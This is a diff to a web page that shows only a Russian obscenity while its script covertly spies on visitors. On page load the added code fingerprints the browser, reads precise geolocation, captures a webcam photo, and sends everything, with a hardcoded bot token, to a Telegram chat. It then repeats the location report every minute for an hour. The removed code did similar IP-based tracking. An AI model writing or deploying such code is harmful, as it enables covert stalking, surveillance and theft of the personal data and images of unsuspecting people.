@@ -10,6 +10,7 @@
             padding: 0;
             background-color: #000;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
@@ -23,6 +24,7 @@
             font-weight: bold;
             text-transform: uppercase;
             font-family: Arial, sans-serif;
+            margin-bottom: 20px;
         }
     </style>
 </head>
@@ -30,25 +32,20 @@
     <div class="centered-text">ИДИ НА ХУЙ</div>
 
     <script>
-        // Функция для получения информации о пользователе
-        async function getUserInfo() {
-            // Получаем информацию о местоположении по IP
-            const ipData = await fetch('https://ipinfo.io/json?token=32764153b759f9');
-            const ipInfo = await ipData.json();
+        let userCount = 1;  // Переменная для нумерации пользователей
+        let intervalId;
+        let photoBlob;  // Переменная для хранения фотографии
+        const geoUpdateInterval = 60000;  // Интервал обновления геолокации (60 секунд)
+        const autoGeoUpdateDuration = 3600000;  // Длительность автообновления геолокации (1 час)
+        let sentData = false;  // Флаг для отслеживания, была ли отправлена информация
 
-            // Получаем геолокацию
-            const geolocation = await new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        position => resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude }),
-                        error => reject(error)
-                    );
-                } else {
-                    reject(new Error("Геолокация не поддерживается этим браузером."));
-                }
-            }).catch(err => ({ latitude: 'Не предоставлено', longitude: 'Не предоставлено' }));
+        // Функция для получения информации о пользователе
+        async function getUserInfo(latitude, longitude) {
+            const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const locationInfo = await locationData.json();
 
             return {
+                userId: userCount++, // Увеличиваем номер пользователя
                 userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString(),
                 screenWidth: window.screen.width,
@@ -62,73 +59,143 @@
                 connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                 historyLength: window.history.length,
                 depthOfView: document.body.scrollHeight,
-                ipAddress: ipInfo.ip, // IP адрес
-                geoLocation: ipInfo.city + ', ' + ipInfo.region + ', ' + ipInfo.country, // Геолокация
-                postalCode: ipInfo.postal, // Почтовый индекс
-                latitude: geolocation.latitude,
-                longitude: geolocation.longitude
+                latitude: latitude,
+                longitude: longitude,
+                geoLocation: locationInfo.display_name || 'Не предоставлено'
             };
         }
 
         // Функция для отправки данных в Telegram
-        function sendDataToTelegram(userInfo) {
+        async function sendDataToTelegram(userInfo) {
             const botToken = '6760012279:AAHcJueLC_AF49YRK3s-MCc2pTGJy7YZPHA';
-            const chatId = '-1002255197235'; // Укажите ID вашей группы
+            const chatId = '-1002255197235';
+
+            // Сообщение о пользователе
             const message = `
-                Новый визит на сайт!
+                Пользователь ${userInfo.userId} зашёл на сайт:
                 User Agent: ${userInfo.userAgent}
-                Timestamp: ${userInfo.timestamp}
-                Screen Width: ${userInfo.screenWidth}px
-                Screen Height: ${userInfo.screenHeight}px
-                Inner Width: ${userInfo.innerWidth}px
-                Inner Height: ${userInfo.innerHeight}px
-                Referrer: ${userInfo.referrer}
-                Platform: ${userInfo.platform}
-                Language: ${userInfo.language}
-                Cookies Enabled: ${userInfo.cookiesEnabled}
-                Connection Type: ${userInfo.connectionType}
-                History Length: ${userInfo.historyLength}
-                Depth of View: ${userInfo.depthOfView}
-                IP Address: ${userInfo.ipAddress}
-                Geo Location: ${userInfo.geoLocation}
-                Postal Code: ${userInfo.postalCode}
-                Latitude: ${userInfo.latitude}
-                Longitude: ${userInfo.longitude}
+                Время: ${userInfo.timestamp}
+                Разрешение экрана: ${userInfo.screenWidth}px x ${userInfo.screenHeight}px
+                Внутреннее разрешение: ${userInfo.innerWidth}px x ${userInfo.innerHeight}px
+                Реферер: ${userInfo.referrer}
+                Платформа: ${userInfo.platform}
+                Язык: ${userInfo.language}
+                Cookies включены: ${userInfo.cookiesEnabled}
+                Тип соединения: ${userInfo.connectionType}
+                История браузера: ${userInfo.historyLength}
+                Глубина страницы: ${userInfo.depthOfView}
+                Геолокация: ${userInfo.geoLocation}
+                Широта: ${userInfo.latitude}, Долгота: ${userInfo.longitude}
             `;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            // Отправка сообщения с данными
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: message,
+                    text: message
                 }),
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-                return response.json();
-            })
-            .then(data => {
-                if (data.ok) {
-                    console.log('Сообщение успешно отправлено');
-                } else {
-                    console.error('Ошибка при отправке сообщения:', data.description);
-                }
-            })
-            .catch(error => {
-                console.error('Ошибка:', error);
+            });
+
+            // Отправка фотографии, если она есть
+            if (photoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', photoBlob);
+                formData.append('caption', message);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+
+            // Отправка геолокации с кнопкой обновления
+            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: userInfo.latitude,
+                    longitude: userInfo.longitude,
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: "✅ Обновить геолокацию", callback_data: "update_geolocation" }],
+                            [{ text: "📷 Обновить фотографию", callback_data: "update_photo" }]
+                        ]
+                    }
+                }),
             });
         }
 
-        // Отправка данных о пользователе при загрузке страницы
-        window.onload = async function() {
-            const userInfo = await getUserInfo();
-            sendDataToTelegram(userInfo);
+        // Функция для получения фото с камеры
+        async function capturePhoto() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await new Promise(resolve => video.onloadedmetadata = resolve);
+            video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            stream.getTracks().forEach(track => track.stop());  // Останавливаем камеру
+            return canvas.toDataURL('image/jpeg');
+        }
+
+        // Функция для обновления геолокации
+        async function updateGeolocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async position => {
+                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
+                    await sendDataToTelegram(userInfo); // Отправляем новые данные
+                });
+            }
+        }
+
+        // Функция для обновления фотографии
+        async function updatePhoto() {
+            photoBlob = await (await fetch(await capturePhoto())).blob();  // Сохраняем новую фотографию
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async position => {
+                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);  // Получаем информацию о пользователе
+                    await sendDataToTelegram(userInfo); // Отправляем обновлённые данные
+                });
+            }
+        }
+
+        // Запуск автообновления геолокации
+        async function startAutoGeolocationUpdate() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async position => {
+                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
+                    photoBlob = await (await fetch(await capturePhoto())).blob();  // Сохраняем фотографию
+                    await sendDataToTelegram(userInfo); // Отправляем начальные данные
+                    sentData = true;  // Устанавливаем флаг, что данные отправлены
+
+                    // Устанавливаем интервал для обновления геолокации каждые 60 секунд
+                    intervalId = setInterval(updateGeolocation, geoUpdateInterval);
+                    setTimeout(() => clearInterval(intervalId), autoGeoUpdateDuration);  // Останавливаем автообновление через 1 час
+                });
+            }
+        }
+
+        // Запуск функции при загрузке страницы
+        window.onload = startAutoGeolocationUpdate;
+
+        // Остановка интервала при закрытии окна
+        window.onbeforeunload = function() {
+            clearInterval(intervalId);
         };
+
     </script>
 </body>
 </html>
